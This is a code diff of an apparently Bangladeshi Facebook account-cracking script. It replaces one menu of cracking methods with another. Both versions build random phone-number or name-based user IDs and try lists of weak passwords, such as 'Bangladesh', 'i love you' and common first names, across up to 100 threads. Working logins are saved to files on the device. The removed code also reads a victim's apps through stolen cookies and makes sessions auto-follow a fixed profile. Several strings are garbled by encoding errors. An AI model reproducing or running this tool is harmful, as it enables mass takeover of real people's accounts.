@@ -252,74 +252,35 @@ logo = ("""
 \033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━╝\033[1;37m\n""")
 
     
-#---------------------[LOOP MENU]---------------------#
-loop = 0
-cp = []
-ok = []
-twf = []
+def Main():
+	os.system('clear')
+	print(logo)
+	print('[\033[1;32m1\033[1;37m] Mathod 1 [\033[1;32mSlow <> Fire\033[1;37m] ')
+	print('[\033[1;32m2\033[1;37m] Mathod 2 [\033[1;32mWorking\033[1;37m] ')
+	#print("[\033[1;32m3\033[1;37m] Mathod 3")
+	#print('[\033[1;32m!\033[1;37m] More Mathod Added Soon ')
+	#print("\033[97;1m  Ã¢ÂÂ¥ 4 Ã¢â‚¬Â£  Ã°ÂÂâ€šÃ°ÂÂÂ¨Ã°ÂÂÂ§Ã°ÂÂÂ­Ã°ÂÂÂ«Ã°ÂÂÅ¡Ã°ÂÂÅ“Ã°ÂÂÂ­ Ã°ÂÂâ‚¬Ã°ÂÂÂÃ°ÂÂÂ¦Ã°ÂÂÂ¢Ã°ÂÂÂ§ ")
+	#print('\033[97;1m  Ã¢ÂÂ¥ 5 Ã¢â‚¬Â£  Ã°ÂÂÂÃ°ÂÂÅ¡Ã°ÂÂÅ“Ã°ÂÂÂ¤')
+	# print('â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
+	
+	opt = input('[\033[1;32m\033[1;37m3] Choice : ')
+	if opt =='1':
+		mathod1()
+	if opt =='2':
+		mathod2()
+	#if opt =='3':
+		#mathod3()
+	#if opt =='4':
+		#admin()
+	elif opt =='0':
+		exit()
+	else:
+		print('\n\033[1;92mChoice Vaild Option\033[0;97m');time.sleep(1)
+		Main()
 
-
-#---------------------[APPLICATION CHECKER]---------------------#
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        #print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
-    #else:
-        #print(f'  \r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
-        for i in range(len(game)):
-            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) Jibon
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        #print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
-        #print()
-    #else:
-        #print(f'  \r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
-        for i in range(len(game)):
-            print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print()
-
- 
-
-def follow(ses,coki):
-    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
-    get = r.find('a', string='Follow').get('href')
-    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-#---------------------[MAIN MENU]---------------------#
-
-class Main:
-    def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.twf = []
-        self.loop = 0
-        os.system("clear")
-        print(logo)
-        print("  [01] \033[1;97m\033[1;45mBD RANDOM UID CLONE\033[1;0m\033[1;97m\033[38;5;46m")
-        print("  [02] RANDOM EMAIL CLONE ")
-        print("  [00] EXIT")
-        Mumit =input("  \033[1;97m[??] CHOOSE : ")
-        os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
-        if Mumit in ["1", "01"]:
-            num()
-        if Mumit in ["2","02"]:
-            gml()
-        if Mumit in [" 0", "00"]:
-            exit()
-        else:
-            exit()
-def num():
-    user=[]
-    os.system('clear')
+def mathod1():
+	user=[]
+	os.system('clear')
 	print(logo)
 	print(" [\033[1;32m1\033[1;37m] BD SIM CODE  : \033[1;32m016 - 017 - 018 - 019\033[1;37m ")
 	kode = input(' [\033[1;32m2\033[1;37m] SELECT       : ')
@@ -348,43 +309,41 @@ def num():
 	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
 	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE Ã¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
 	print(47*'\033[1;31m\033[1;37m')
-    
-def gml():
-    user=[]
-    os.system('clear')
-    print(logo)
-    kode = input('  [?] TARGET FAST NAME : ')
-    os.system('clear')
-    print(logo)
-    kodex = input('  [?] TARGET LAST NAME :  ')
-    os.system('clear')
-    print(logo)
-    print('  [+] EXAMPLE : @gmail.com, @yahoo.com ')
-    doamin = input('  [?] TERGET DOAMIN : ')
-    os.system('clear')
-    print(logo)
-    print('  [+] EXAMPLE : 5000, 10000, 50000 ')
-    limit = int(input(' [?] CRACK LIMIT : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        ip = requests.get("https://api.ipify.org").text
-       # jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
-        print(' \033[0m [+] TOTAL IDS:\033[38;5;45m '+tl)
-        print(' \033[0m [+] PROCESS HAS BEEN STARTED')
-        print(' \033[0m [!] WAIT FOR IDS ')
-        print(' \033[0m [!] USE FLIGHT MODE FOR SPEED UP ')
-        print("  \x1b[1;96m--------------------------------------------------")
-        for guru in user:
-            uid = kode+kodex+guru+doamin
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@@',kode+'###',kode+'@1234',kode+'@123',kode+'@12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'@@@',kodex+'###',kodex+'@1234',kodex+'@123',kodex+'@12345',]
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print('  [+] Crack process has been completed')
-    print('  [+] Ids saved in ok.txt,cp.txt')
+	exit()
+
+def mathod2():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" [\033[1;32m!\033[1;37m] Sim Code : \033[1;32m016 - 017 - 018 - 019\033[1;37m ")
+	kode = input(' [\033[1;32m?\033[1;37m] Choice : ')
+	doamin = ' Ã°ÂÂÂÃ°ÂÂÆ’ Ã°ÂÂÂÃ°ÂÂÂ®Ã°ÂÂÂ¦Ã°ÂÂâ€ºÃ°ÂÂÅ¾Ã°ÂÂÂ« Ã°ÂÂÅ“Ã°ÂÂÂ¥Ã°ÂÂÂ¨Ã°ÂÂÂ§Ã°ÂÂÅ¾Ã°ÂÂÂ« '
+	print(" [\033[1;32m!\033[1;37m] Example Limit : \033[1;32m2000 - 5000 - 10000\033[1;37m ")
+	limit = int(input(' [\033[1;32m?\033[1;37m] Put Cloneing Limit : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=100) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(' Cloneing Limit :\033[1;92m '+tl)
+		print(f' \033[1;37mSim Code :\033[1;92m {kode}\033[1;37m ')
+		print(' Use [\033[1;32mAirplane\033[1;37m] Mode For Ok Ids')
+		print("\x1b[1;96m--------------------------------------------------")
+		print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+kode+'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','113355','22334455','121235']
+			yaari.submit(m2,uid,pwx,tl)
+	print(47*'\033[1;31m\033[1;37m')
+	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
+	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/JIBONÃ¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
+	print(47*'\033[1;31m\033[1;37m')
+	exit()
+	
 def a(uid,pwx,tl):
     global loop
     global cps    
@@ -393,7 +352,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:        	            
             session = requests.Session()
-            sys.stdout.write(f'\r [JIBON-XD] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r [JIBON-M1] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
